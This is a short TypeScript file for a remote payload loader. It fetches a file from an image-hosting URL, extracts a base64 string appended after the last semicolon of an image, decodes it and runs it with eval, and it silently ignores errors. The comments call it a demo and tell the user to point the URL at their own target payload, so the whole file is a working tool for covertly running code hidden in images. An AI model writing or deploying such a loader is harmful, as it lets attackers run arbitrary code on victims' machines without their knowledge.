/**
 * Set this to your target download location for source code to execute.
 * For the demo payload (alert) an imgbb.com url is set.
 * But for throne's sake don't trust random code on the internet and change this.
 * @type {string}
 */
const LOADER_URL: string = "https://i.ibb.co/x2FNPks/copyright.png"

/**
 * The loader a small fetch script which extracts a remote url and unsafely
 *  evaluates the string.
 *
 * The loader assumes the `payload` code has been appended to a gif file after
 *  the trailing semicolon.
 *
 * Make sure to modify the `loader` url to your target base64 text file.
 *
 * @returns {void}
 */
fetch(LOADER_URL)
  .then((r) => r.text())
  .then((data) =>
    eval(atob(data.split(";").pop() ?? ""))
  ).catch(_e => {
  // Silent...
})
